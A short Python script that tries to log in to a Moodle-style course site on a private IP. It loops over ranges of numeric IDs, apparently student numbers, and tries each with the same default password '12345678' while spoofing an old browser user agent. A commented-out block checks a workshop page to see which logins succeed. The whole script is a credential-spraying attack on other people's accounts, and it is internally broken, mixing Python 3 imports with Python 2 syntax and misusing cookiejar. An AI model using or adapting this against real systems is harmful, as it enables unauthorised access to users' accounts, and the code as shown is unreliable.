# -*- coding: utf-8 -*-
import urllib.request as UR
import urllib
import http.cookiejar

a=[]
for i in range(14061001,14061233):a.append(str(i))
for i in range(14231001,14231100):a.append(str(i))

	

def dididi():
        login_page = "http://10.254.25.5/course/login/index.php"
        url = "http://10.254.25.5/course/mod/workshop/view.php?id=133"
        target="2594"
        for i in range(len(a)):
                try:
                        cj = http.cookiejar()
                        opener=UR.build_opener(UR.HTTPCookieProcessor(cj))
                        opener.addheaders = [('User-agent','Mozilla/6.0 (compatible; MSIE 6.0; Windows NT 5.1)')]
                        data = urllib.urlencode({"username":a[i],"password":"12345678"})
                        opener.open(login_page,data)
                        print a[i]
                        '''op=opener.open(url)
                        content=op.read()
                        if(target in content):print str(a[i])+"dddddddddddddddddddddddddddd\n";
                        else:print str(a[i])+"failed\n"'''
                except:
                        print str(a[i])+"error\n"


dididi()




